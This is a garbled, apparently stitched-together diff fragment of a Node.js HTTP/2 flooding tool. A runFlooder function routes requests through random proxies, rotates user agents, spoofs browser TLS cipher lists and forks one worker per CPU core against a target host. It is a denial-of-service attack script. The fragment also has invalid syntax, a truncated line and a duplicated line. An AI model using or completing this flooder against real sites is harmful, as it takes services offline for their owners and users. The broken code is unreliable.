@@ -1,0 +1,50 @@
+<operator>.formatString("", getRandomByte(), ".", getRandomByte(), ".", getRandomByte(), ".", getRandomByte(), "")
+const sig = [    
+    'ecdsa_secp256r1_sha256',
+    'ecdsa_secp384r1_sha384',
+    'ecdsa_secp521r1_sha512',
+    'rsa_pss_rsae_sha256',
+    'rsa_pss_rsae_sha384',
+    'rsa_pss_rsae_sha512',
+    'rsa_pkcs1_sha256',
+    'rsa_pkcs1_sha384',
+    'rsa_pkcs1_sha512'
+ ]
+_tmp_13.push(":ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK")
+_tmp_33.push(":ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK")
+_tmp_14.push("text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9")
+Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }))
+function runFlooder = function runFlooder() {
+     const proxyAddr = randomElement(proxies);
+     const parsedProxy = proxyAddr.split(":");
+     const userAgentv2 = new UserAgent();
+     var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
+     headers[":authority"] = parsedTarget.host
+     headers["user-agent"] = uap1;
+ 
+     const proxyOptions = {
+         host: parsedProxy[0],
+         port: ~~parsedProxy[1],
+         address: parsedTarget.host + ":443",
+         timeout: 25
+     };
+
+    setTimeout(function(){
+      process.exit(1);
+    }, process.argv[3] * 1000);
+    
+    process.on('uncaughtException', function(er) {
+    });
+    process.on('unhandledRejection', function(er) {
+    });
+
+     Socker.HTTP(proxyOptions, (connection, error) => {
+         if (error) return
+ 
+         connection.setKeepAlive(true, 100000);
+
+         const tlsOptions = {
+            ALPNProtocols: ['h2'],
+            challengesToSolve: Infinity,
+            resolveWithFullRespon...
+Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }))
